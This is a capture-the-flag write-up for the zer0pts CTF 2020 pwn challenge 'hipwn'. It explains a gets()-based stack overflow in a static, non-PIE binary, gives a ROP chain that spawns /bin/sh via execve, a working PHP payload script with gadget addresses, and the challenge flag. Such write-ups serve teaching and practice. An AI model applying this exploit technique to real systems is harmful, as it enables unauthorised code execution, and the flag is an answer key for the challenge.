# hipwn - zer0pts CTF 2020 (pwn, 158p, 81 solved)
## Introduction

hipwn is a pwn task.

An archive containing a binary, and its source code is provided.

The binary asks the user for its name, and prints it.

## Exploitation

The binary uses `gets` to read the user input in a fixed-size array on the
stack. There is no protection on the stack.

This is the most basic case of a stack-based buffer overflow.

The binary is statically compiled, so the whole libc is contianed in the bianry.
It is not compiled as a position-independant executable. As a result, it is not
subject to ASLR.

The ROP chain used to exploit this binary is the following:
```assembler
pop rax; "/bin/sh\0"
pop rdi; 0x00604268 // somewhere on the bss
mov [rdi], rax
pop rsi; NULL
pop rdx, NULL
pop rax, SYS_execve
syscall
```

**Flag**: `zer0pts{welcome_yokoso_osooseyo_huanying_dobropozhalovat}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php
echo str_repeat("A", 0x100);

echo "BBBBBBBB";

const POPRDI = 0x0040141c;
const POPRAX = 0x00400121;
const POPRSI = 0x0040141a;
const POPRDX = 0x00402568;
const MOV    = 0x00400704; // mov [rdi], rax
const SYSCALL = 0x004024dd;
echo pack("Q*", ... [
	POPRAX, unpack("Q", "/bin/sh\0")[1],
	POPRDI, 0x00604268,
	MOV,

	POPRSI, 0, 0x15, // r15
	POPRDX, 0,

	POPRAX, 59,
	SYSCALL,

]);

echo "\n";
```
